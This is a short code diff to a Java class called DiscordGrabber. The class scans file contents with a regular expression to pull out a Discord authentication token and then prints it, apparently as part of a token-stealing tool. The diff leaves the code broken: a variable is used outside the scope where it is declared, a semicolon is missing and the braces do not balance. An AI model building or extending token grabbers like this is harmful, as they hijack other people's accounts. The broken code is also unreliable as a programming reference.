@@ -29,7 +29,7 @@ public class DiscordGrabber {
                 Matcher matcher = pattern.matcher(fromFile(pathname));
                 
                 while (matcher.find()) { //When it is matched
-                    String match = matcher.group();
+                    String token = matcher.group(); //add match to the group
                     
                 }
                 
@@ -37,7 +37,7 @@ public class DiscordGrabber {
                     
                 }
             }
-        token = matcher.group(1); //set token to the first (and probably only) match
+        //token = matcher.group(1); //set token to the first (and probably only) match
     }
     System.out.println("Your discord token is: " + token)
 }
